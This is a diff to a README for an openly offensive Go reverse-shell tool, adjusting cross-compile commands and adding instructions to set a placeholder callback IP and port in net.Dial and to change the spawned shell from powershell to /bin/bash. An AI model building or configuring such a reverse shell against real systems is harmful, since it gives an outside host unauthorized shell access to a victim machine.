@@ -32,13 +32,13 @@ GOOS=windows GOARCH=amd64 go build -o revershell.exe revershell.go
  🐧 Linux (x64)
  
 ```bash
-GOOS=linux GOARCH=amd64 go build -o shell main.go
+GOOS=linux GOARCH=amd64 go build -o shell revershell.go
 ```
 
 📱 ARM64 (Linux/macOS)
 
 ```bash
-GOOS=linux GOARCH=arm64 go build -o shell_arm64 main.go
+GOOS=linux GOARCH=arm64 go build -o shell_arm64 revershell.go
 ```
 
 ### Configuration
@@ -51,6 +51,13 @@ Open `revershell.go` and update the connection string:
 // Replace "127.0.0.1" with your IP (e.g., "10.10.14.5") 
 // Replace "4444" with your desired port 
 conn, _ := net.Dial("tcp", "your_ip_here:your_port_here")
+```
+
+and replace powershell to you choose
+
+```
+// Replace "powershell" to (e.g., "/bin/bash")
+cmd:=exec.Command("powershell");
 ```
 
 
